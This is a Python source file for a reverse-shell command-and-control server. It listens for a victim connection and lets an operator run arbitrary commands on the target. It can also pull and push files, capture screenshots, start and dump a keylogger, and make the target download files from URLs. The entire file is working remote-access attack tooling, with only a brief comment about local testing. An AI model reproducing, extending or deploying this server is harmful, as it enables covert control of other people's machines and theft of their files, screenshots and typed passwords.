#!/usr/bin/python3
import socket
import json
import base64
import os
import threading

class ReverseShellServer:
    def __init__(self, host='0.0.0.0', port=54321):
        self.host = host
        self.port = port
        self.screenshot_count = 1
        self.keylogger_active = False
        self.keylog_data = ""
        
    def reliable_send(self, conn, data):
        json_data = json.dumps(data)
        conn.send(json_data.encode())
        
    def reliable_recv(self, conn):
        json_data = ""
        while True:
            try:
                json_data += conn.recv(1024).decode()
                return json.loads(json_data)
            except (ValueError, json.JSONDecodeError):
                continue
                
    def handle_download(self, conn, filename):
        try:
            result = self.reliable_recv(conn)
            if not result.startswith('[!!]'):
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(result))
                return f"[+] Downloaded: {filename}"
            return result
        except Exception as e:
            return f"[!] Download failed: {e}"
            
    def handle_upload(self, conn, filename):
        try:
            # Check if file exists on server
            if os.path.exists(filename):
                print(f"[*] File found: {filename}")
                print(f"[*] Uploading to client...")
                with open(filename, 'rb') as f:
                    file_data = base64.b64encode(f.read()).decode()
                # Send the file data to client
                self.reliable_send(conn, file_data)
                print("[*] Waiting for confirmation...")
                # Wait for client confirmation
                result = self.reliable_recv(conn)
                return result
            else:
                error_msg = f"[!] File not found on server: {filename}"
                print(error_msg)
                print(f"[!] Current directory: {os.getcwd()}")
                print(f"[!] Looking for: {os.path.abspath(filename)}")
                # Send error message to client
                self.reliable_send(conn, error_msg)
                return error_msg
        except Exception as e:
            error_msg = f"[!] Upload failed: {e}"
            print(error_msg)
            try:
                self.reliable_send(conn, error_msg)
            except:
                pass
            return error_msg
            
    def handle_screenshot(self, conn):
        try:
            image_data = self.reliable_recv(conn)
            if not image_data.startswith('[!!]'):
                filename = f"screenshot_{self.screenshot_count}.png"
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(image_data))
                self.screenshot_count += 1
                return f"[+] Screenshot saved: {filename}"
            return image_data
        except Exception as e:
            return f"[!] Screenshot failed: {e}"
            
    def show_help(self):
        print('''
Available Commands:
- download <filename>  - Download file from target to server
- upload <filename>    - Upload file from server to target  
- screenshot           - Take screenshot (Windows/Linux with GUI)
- sysinfo             - Get system information
- keylog_start        - Start keylogger on target
- keylog_stop         - Stop keylogger on target  
- keylog_dump         - Get captured keystrokes
- get <url>           - Download file from URL to target
- cd <path>           - Change directory on target
- help                - Show this help
- quit                - Exit
- Any system command  - Execute on target

Note: For upload, file must exist in server's current directory
      Current directory: ''' + os.getcwd())
            
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((self.host, self.port))
            server.listen(5)
            print(f"[*] Server listening on {self.host}:{self.port}")
            print(f"[*] Server directory: {os.getcwd()}")
            print("[*] Waiting for incoming connections...")
            
            conn, addr = server.accept()
            print(f"[+] Connection from: {addr}")
            
            while True:
                try:
                    command = input("Shell> ").strip()
                    if not command:
                        continue
                    
                    # Handle local commands that don't need to be sent to client
                    if command == 'help':
                        self.show_help()
                        continue  # Don't send to client
                    
                    # Handle keylogger commands
                    if command == "keylog_start":
                        self.reliable_send(conn, command)
                        result = self.reliable_recv(conn)
                        print(result)
                        continue
                    elif command == "keylog_stop":
                        self.reliable_send(conn, command)
                        result = self.reliable_recv(conn)
                        print(result)
                        continue
                    elif command == "keylog_dump":
                        self.reliable_send(conn, command)
                        result = self.reliable_recv(conn)
                        print("=== KEYLOGS ===")
                        print(result)
                        print("===============")
                        continue
                    
                    # Send command to client
                    self.reliable_send(conn, command)
                    
                    # Handle quit/exit
                    if command.lower() in ['q', 'quit', 'exit']:
                        break
                    # Handle download
                    elif command.startswith('download '):
                        result = self.handle_download(conn, command[9:])
                        print(result)
                    # Handle upload
                    elif command.startswith('upload '):
                        result = self.handle_upload(conn, command[7:])
                        print(result)
                    # Handle screenshot
                    elif command == 'screenshot':
                        result = self.handle_screenshot(conn)
                        print(result)
                    # All other commands (including sysinfo) - wait for response
                    else:
                        result = self.reliable_recv(conn)
                        print(result)
                        
                except KeyboardInterrupt:
                    print("\n[*] Shutting down...")
                    break
                except Exception as e:
                    print(f"[!] Error: {e}")
                    break
                    
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            try:
                conn.close()
            except:
                pass
            server.close()
            print("[*] Server closed")

if __name__ == "__main__":
    # Use localhost for single machine testing (127.0.0.1)
    # Use 0.0.0.0 for network testing
    server = ReverseShellServer('127.0.0.1', 54321)
    server.start()